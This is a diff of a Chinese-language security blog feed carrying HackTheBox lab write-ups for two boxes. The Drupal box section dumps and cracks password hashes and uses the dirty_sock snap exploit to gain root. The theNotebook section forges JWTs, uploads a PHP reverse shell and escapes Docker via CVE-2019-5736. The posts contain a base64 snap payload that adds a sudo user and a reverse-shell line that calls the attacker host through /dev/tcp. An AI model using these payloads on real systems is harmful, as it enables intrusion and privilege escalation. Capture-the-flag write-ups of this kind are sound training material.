+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;show tables;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tables_in_drupal</span><br><span class="line">actions</span><br><span class="line">authmap</span><br><span class="line">batch</span><br><span class="line">block</span><br><span class="line">block_custom</span><br><span class="line">block_node_type</span><br><span class="line">block_role</span><br><span class="line">blocked_ips</span><br><span class="line">cache</span><br><span class="line">cache_block</span><br><span class="line">cache_bootstrap</span><br><span class="line">cache_field</span><br><span class="line">cache_filter</span><br><span class="line">cache_form</span><br><span class="line">cache_image</span><br><span class="line">cache_menu</span><br><span class="line">cache_page</span><br><span class="line">cache_path</span><br><span class="line">comment</span><br><span class="line">date_format_locale</span><br><span class="line">date_format_type</span><br><span class="line">date_formats</span><br><span class="line">field_config</span><br><span class="line">field_config_instance</span><br><span class="line">field_data_body</span><br><span class="line">field_data_comment_body</span><br><span class="line">field_data_field_image</span><br><span class="line">field_data_field_tags</span><br><span class="line">field_revision_body</span><br><span class="line">field_revision_comment_body</span><br><span class="line">field_revision_field_image</span><br><span class="line">field_revision_field_tags</span><br><span class="line">file_managed</span><br><span class="line">file_usage</span><br><span class="line">filter</span><br><span class="line">filter_format</span><br><span class="line">flood</span><br><span class="line">history</span><br><span class="line">image_effects</span><br><span class="line">image_styles</span><br><span class="line">menu_custom</span><br><span class="line">menu_links</span><br><span class="line">menu_router</span><br><span class="line">node</span><br><span class="line">node_access</span><br><span class="line">node_comment_statistics</span><br><span class="line">node_revision</span><br><span class="line">node_type</span><br><span class="line">queue</span><br><span class="line">rdf_mapping</span><br><span class="line">registry</span><br><span class="line">registry_file</span><br><span class="line">role</span><br><span class="line">role_permission</span><br><span class="line">search_dataset</span><br><span class="line">search_index</span><br><span class="line">search_node_links</span><br><span class="line">search_total</span><br><span class="line">semaphore</span><br><span class="line">sequences</span><br><span class="line">sessions</span><br><span class="line">shortcut_set</span><br><span class="line">shortcut_set_users</span><br><span class="line">system</span><br><span class="line">taxonomy_index</span><br><span class="line">taxonomy_term_data</span><br><span class="line">taxonomy_term_hierarchy</span><br><span class="line">taxonomy_vocabulary</span><br><span class="line">url_alias</span><br><span class="line">users</span><br><span class="line">users_roles</span><br><span class="line">variable</span><br><span class="line">watchdog</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>users</code>表中有哪些字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;desc users;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/desctables.png" alt="desctables"></p>
+<p><strong>name</strong>和<strong>pass</strong>应该就是账号密码了，查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#x27;select name,pass from users;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userpwd.png" alt="userpwd"></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>除了利用网上找到的Exp也可以使用工具Metasploit</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf1.png" alt="msf1"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf2.png" alt="msf2"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/msf3.png" alt="msf3"></p>
+<p>getshell以后操作和方法一差不多就不继续写了，可以参考上面的。</p>
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>在数据库里得到了brucetherealadmin用户的账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brucetherealadmin   $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt</span><br></pre></td></tr></table></figure>
+
+<p>密码应该是hash加密过了，用Kali里自带的工具<code>john the ripper</code>破解</p>
+<p>新建一个txt文档存放密码，john命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt -w /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/johnpass.png" alt="johnpass"></p>
+<p>得到密码为<code>booboo</code></p>
+<p>尝试刚得到的用户名密码<code>SSH</code>，连接成功</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/sshuser.png" alt="sshuser"></p>
+<p>user.txt在<code>~</code>目录下</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/userflag.png" alt="userflag"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用<code>sudo -l</code>查看用户的权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/usersudo.png" alt="usersudo"></p>
+<p>直接google搜索<code>(root) NOPASSWD: /usr/bin/snap install *</code></p>
+<p>得到有用的信息<a href="https://github.com/initstring/dirty_sock/">dirty_sock:Linux提权漏洞</a>（snap漏洞分析参考链接2）</p>
+<blockquote>
+<p>2019年1月，由于默认安装的服务snapd API中的一个bug，通过默认安装的Ubuntu Linux被发现存在特权提升漏洞，任何本地用户都可以利用此漏洞直接获取root权限。</p>
+</blockquote>
+<p>通过<code>python --version</code>发现本地是python2，本台靶机用<code>dirty_sockv2.py</code>中的一部分就可以提权了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dirtysock.png" alt="dirtysock"></p>
+<p>snap本身运行在沙箱环境中，exp通过snap的开发模式（“devmode”）来降低限制条件，从而像主机上的其他应用一样来访问主机。snap还引入了“hooks”机制，“install hook”会在snap安装时运行，如果snap配置为开发模式，hook将会在root上下文中运行</p>
+<p>脚本作用就是添加了一个<code>dirty_sock</code>用户可以提权到root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &#x27;print &quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot; + &quot;A&quot;*4256 + &quot;==&quot;&#x27; | base64 -d &gt; jasontt.snap</span><br></pre></td></tr></table></figure>
+
+<p>安装jasont.snap</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /user/bin/snap install --devmode jasontt.snap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snap.png" alt="snap"></p>
+<p>用<code>cat /etc/passwd</code>看看<code>dirty_sock</code>用户有没有添加成功</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/adduser.png" alt="adduser"></p>
+<p>用户添加成功了，我们用<code>su</code>命令切换到<code>sock_dirty</code>用户，密码同用户名</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/drty_sock.png" alt="drty_sock"></p>
+<p>得到root权限，拿到root.txt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/root.png" alt="root"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.exploit-db.com/exploits/44449">https://www.exploit-db.com/exploits/44449</a></p>
+<p><a href="https://initblog.com/2019/dirty-sock/">https://initblog.com/2019/dirty-sock/</a></p>
+<p><a href="https://github.com/initstring/dirty_sock">https://github.com/initstring/dirty_sock</a></p>
 ]]></content>
       <tags>
         <tag>HackTheBox</tag>
@@ -544,111 +544,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HackTheBox-theNotebook</title>
-    <url>/2022/01/07/HackTheBox-theNotebook/</url>
-    <content><![CDATA[<h1 id="Hackthebox-theNotebook"><a href="#Hackthebox-theNotebook" class="headerlink" title="Hackthebox-theNotebook"></a>Hackthebox-theNotebook</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_pwned.png" alt="pwned"></p>
-<span id="more"></span>
-
-<blockquote>
-<p>本机IP：10.10.16.11</p>
-<p>目标IP：10.10.10.230</p>
-</blockquote>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.jwt令牌伪造</p>
-<p>2.CVE-2019-5736 docker容器逃逸</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_nmap.png" alt="nmap"></p>
-<p>还是熟悉的22和80端口，访问下网站</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/notebook.png" alt="notebook"></p>
-<p>测试了一下，登录和注册界面应该不存在sql注入</p>
-<p>尝试注册admin发现用户已经存在了</p>
-<p>注册登陆以后的功能就是<strong>notebook</strong>的笔记功能，类似于备忘录吧</p>
-<p>简单测试一下似乎也不存在xss漏洞</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_xss.png" alt="xss"></p>
-<p>发现F12 请求头里的cookie长得很像jwt</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_session.png" alt="session"></p>
-<p>拿到<a href="https://jwt.io/%E5%8E%BB%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AFjwt">https://jwt.io/去解码一下，果然是jwt</a></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwt.png" alt="jwt"></p>
-<p><strong>HEADER</strong>里的kid似乎是从本地7070端口获得一个密钥，7070的端口未开放</p>
-<p><strong>PAYLOAD</strong>部分可以看到<code>admin_cap:0</code>，刚才注册时候已经发现admin用户被注册了</p>
-<p>直接访问<code>xx/admin</code>发现报错Forbidden</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/forbidden.png" alt="forbidden"></p>
-<p>参考：<a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c">https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c</a></p>
-<h2 id="伪造JWT令牌"><a href="#伪造JWT令牌" class="headerlink" title="伪造JWT令牌"></a>伪造JWT令牌</h2><p>思路比较清晰了，自己生成一个私钥对jwt签名，并将当前用户设置为管理员</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out privKey.key 1024</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_privkey.png" alt="privkey"></p>
-<p>用python3在本地起一个服务，让目标从本机获取私钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwtfake.png" alt="jwtfake"></p>
-<p>用生成的jwt令牌替换原来的，访问/<code>admin</code>，成功进入管理员界面</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_admin.png" alt="admin"></p>
-<p>管理员界面有两个功能（查看Notes和文件上传）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/viewnote.png" alt="viewnote"></p>
-<p>管理员能同时查看所有注册用户和Admin的notes，其中有两篇中泄露了部分信息供参考</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_php.png" alt="php"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backups.png" alt="backups"></p>
-<p>①存在PHP文件执行的问题需要解决 ②服务器上有备份</p>
-<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>如果可以运行php文件，那么我们可以通过PHP文件执行的问题来上传一个php文件反弹shell</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell.png" alt="uploadshell"></p>
-<p>上传shell.php查看文件成功收到反弹回来的shell，升级为交互式shell（关于交互式和非交互式shell的区别可以自行百度）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null -q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">export TERM=xterm #运行xterm 一种终端</span><br><span class="line">ctrl+z #netcat挂后台</span><br><span class="line">stty raw -echo;fg #stty raw 设置原始输入 -echo 禁止回显，当您在键盘上输入时，并不出现在屏幕上 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">reset #重置远程终端</span><br><span class="line">或者</span><br><span class="line">script /dev/null  //这是偷懒的方法，用起来不是很方便，但是像su之类的命令都可以执行</span><br><span class="line">或者</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; //需要python环境</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_%E4%BA%A4%E4%BA%92%E5%BC%8Fshell.png" alt="交互式shell"></p>
-<p>查看<code>/etc/passwd</code>中看到有个<code>noah</code>用户</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/finduser.png" alt="finduser"></p>
-<p>从上面我们可以发现已经提示过有备份文件，访问<code>/var/backups</code>，发现备份文件<code>home.tar.gz</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/findbackups.png" alt="findbackups"></p>
-<p>因为目标服务器上有python3环境，可以起一个web服务，把备份文件<code>home.tar.gz</code>下载到本机</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/receivetar.png" alt="receivetar"></p>
-<p>解压备份文件发现里面有<code>noah</code>用户的SSH密钥</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_idrsa.png" alt="idrsa"></p>
-<p>通过SSH连接<code>10.10.10.230</code>，在桌面可以得到<code>user.txt</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/noah.png" alt="noah"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>查看用户当前用户可执行的指令，用户可以不需要密码在docker容器执行部分命令</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_sudo.png" alt="sudo"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp_dev01 xxx</span><br></pre></td></tr></table></figure>
-
-<p>查看docker版本为<strong>18.06.0-ce</strong>,google搜一波发现了CVE-2019-5736docker容器逃逸漏洞</p>
-<p>参考：</p>
-<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
-<p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html</a></p>
-<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>runC是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI(command-line interface) 工具。runC是Docker中最为核心的部分，容器的创建、运行、销毁等操作最终都是通过调用runC完成。</p>
-<p>CVE-2019-5736，导致18.09.2版本之前的Docker允许恶意容器覆盖宿主机上的runC二进制文件，由此使攻击者能够以root身份在宿主机上执行任意命令。恶意容器需满足以下两个条件之一:</p>
-<p>(1)由一个攻击者控制的恶意镜像创建</p>
-<p>(2)攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p>
-<p>POC的利用需要在容器内拥有root，由于覆盖了<code>/bin/sh</code>所以当我们把修改好Payload的二进制文件main下载到docker中执行，下次再有人调用docker容器中的<code>/bin/sh</code>就会触发Payload。</p>
-<p>通过修改payload反弹一个shell到本机以获得root</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.SSH连接到目标主机，通过<code>sudo docker exec -it webapp-dev01 bash</code>在docker上执行命令，（暂且称之为SSH1）同时用另一个在另一个命令行窗口SSH连接到目标主机（SSH2）</p>
-<p>2.在本地改好修改好Payload，执行<code>go build main.go</code>生成二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.16.11/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/maingo.png" alt="maingo"></p>
-<p>3.在二进制文件所在目录用python起一个web服务</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_webserver.png" alt="webserver"></p>
-<p>4.在docker容器中执行命令从本机获取二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.11:8000/main</span><br></pre></td></tr></table></figure>
-
-<p>5.赋予二进制文件最高权限，并执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x main &amp;&amp; ./main</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh1main.png" alt="ssh1main"></p>
-<p>6.监听9999端口（端口根据payload里面的来）</p>
-<p>7.在SSH1中二进制文件运行并覆盖完成<code>/bin/sh</code>，SSH2执行如下命令即可收到反弹回来的shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp-dev01 /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh2.png" alt="ssh2"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_rootshell.png" alt="rootshell"></p>
-<p>root.txt在<code>/root</code>目录下</p>
-<p>如果流程看不懂，还有终极图解方便理解（文字表达能力较差，各位师傅多担待）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%85%A8%E5%B1%80.png" alt="全局"></p>
-<p>可能出现问题的点估计就是提权了，我也好久弹不出Shell…</p>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HackTheBox-Pit</title>
     <url>/2022/01/07/HackTheBox-Pit/</url>
     <content><![CDATA[<h1 id="Hackthebox-Pit"><a href="#Hackthebox-Pit" class="headerlink" title="Hackthebox-Pit"></a>Hackthebox-Pit</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_pwn.png" alt="pwn"></p>
@@ -782,6 +677,111 @@
 <p>在SeedDMS版本漏洞利用的点上是官方设计的问题，有文章没解释就说这里应该用<strong>CVE-2019-12744的漏洞</strong>我觉得这是非常不负责任的一件事情，我们应该抱着质疑的态度而不是文章怎么写就照着做</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.poftut.com/snmpwalk-command-line-examples/">https://www.poftut.com/snmpwalk-command-line-examples/</a></p>
 <p><a href="https://blog.csdn.net/dongwuming/article/details/9705595">https://blog.csdn.net/dongwuming/article/details/9705595</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-theNotebook</title>
+    <url>/2022/01/07/HackTheBox-theNotebook/</url>
+    <content><![CDATA[<h1 id="Hackthebox-theNotebook"><a href="#Hackthebox-theNotebook" class="headerlink" title="Hackthebox-theNotebook"></a>Hackthebox-theNotebook</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_pwned.png" alt="pwned"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.11</p>
+<p>目标IP：10.10.10.230</p>
+</blockquote>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.jwt令牌伪造</p>
+<p>2.CVE-2019-5736 docker容器逃逸</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_nmap.png" alt="nmap"></p>
+<p>还是熟悉的22和80端口，访问下网站</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/notebook.png" alt="notebook"></p>
+<p>测试了一下，登录和注册界面应该不存在sql注入</p>
+<p>尝试注册admin发现用户已经存在了</p>
+<p>注册登陆以后的功能就是<strong>notebook</strong>的笔记功能，类似于备忘录吧</p>
+<p>简单测试一下似乎也不存在xss漏洞</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_xss.png" alt="xss"></p>
+<p>发现F12 请求头里的cookie长得很像jwt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_session.png" alt="session"></p>
+<p>拿到<a href="https://jwt.io/%E5%8E%BB%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AFjwt">https://jwt.io/去解码一下，果然是jwt</a></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwt.png" alt="jwt"></p>
+<p><strong>HEADER</strong>里的kid似乎是从本地7070端口获得一个密钥，7070的端口未开放</p>
+<p><strong>PAYLOAD</strong>部分可以看到<code>admin_cap:0</code>，刚才注册时候已经发现admin用户被注册了</p>
+<p>直接访问<code>xx/admin</code>发现报错Forbidden</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/forbidden.png" alt="forbidden"></p>
+<p>参考：<a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c">https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c</a></p>
+<h2 id="伪造JWT令牌"><a href="#伪造JWT令牌" class="headerlink" title="伪造JWT令牌"></a>伪造JWT令牌</h2><p>思路比较清晰了，自己生成一个私钥对jwt签名，并将当前用户设置为管理员</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out privKey.key 1024</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_privkey.png" alt="privkey"></p>
+<p>用python3在本地起一个服务，让目标从本机获取私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwtfake.png" alt="jwtfake"></p>
+<p>用生成的jwt令牌替换原来的，访问/<code>admin</code>，成功进入管理员界面</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_admin.png" alt="admin"></p>
+<p>管理员界面有两个功能（查看Notes和文件上传）</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/viewnote.png" alt="viewnote"></p>
+<p>管理员能同时查看所有注册用户和Admin的notes，其中有两篇中泄露了部分信息供参考</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_php.png" alt="php"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backups.png" alt="backups"></p>
+<p>①存在PHP文件执行的问题需要解决 ②服务器上有备份</p>
+<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>如果可以运行php文件，那么我们可以通过PHP文件执行的问题来上传一个php文件反弹shell</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell.png" alt="uploadshell"></p>
+<p>上传shell.php查看文件成功收到反弹回来的shell，升级为交互式shell（关于交互式和非交互式shell的区别可以自行百度）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null -q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">export TERM=xterm #运行xterm 一种终端</span><br><span class="line">ctrl+z #netcat挂后台</span><br><span class="line">stty raw -echo;fg #stty raw 设置原始输入 -echo 禁止回显，当您在键盘上输入时，并不出现在屏幕上 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">reset #重置远程终端</span><br><span class="line">或者</span><br><span class="line">script /dev/null  //这是偷懒的方法，用起来不是很方便，但是像su之类的命令都可以执行</span><br><span class="line">或者</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; //需要python环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_%E4%BA%A4%E4%BA%92%E5%BC%8Fshell.png" alt="交互式shell"></p>
+<p>查看<code>/etc/passwd</code>中看到有个<code>noah</code>用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/finduser.png" alt="finduser"></p>
+<p>从上面我们可以发现已经提示过有备份文件，访问<code>/var/backups</code>，发现备份文件<code>home.tar.gz</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/findbackups.png" alt="findbackups"></p>
+<p>因为目标服务器上有python3环境，可以起一个web服务，把备份文件<code>home.tar.gz</code>下载到本机</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/receivetar.png" alt="receivetar"></p>
+<p>解压备份文件发现里面有<code>noah</code>用户的SSH密钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_idrsa.png" alt="idrsa"></p>
+<p>通过SSH连接<code>10.10.10.230</code>，在桌面可以得到<code>user.txt</code></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/noah.png" alt="noah"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>查看用户当前用户可执行的指令，用户可以不需要密码在docker容器执行部分命令</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_sudo.png" alt="sudo"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp_dev01 xxx</span><br></pre></td></tr></table></figure>
+
+<p>查看docker版本为<strong>18.06.0-ce</strong>,google搜一波发现了CVE-2019-5736docker容器逃逸漏洞</p>
+<p>参考：</p>
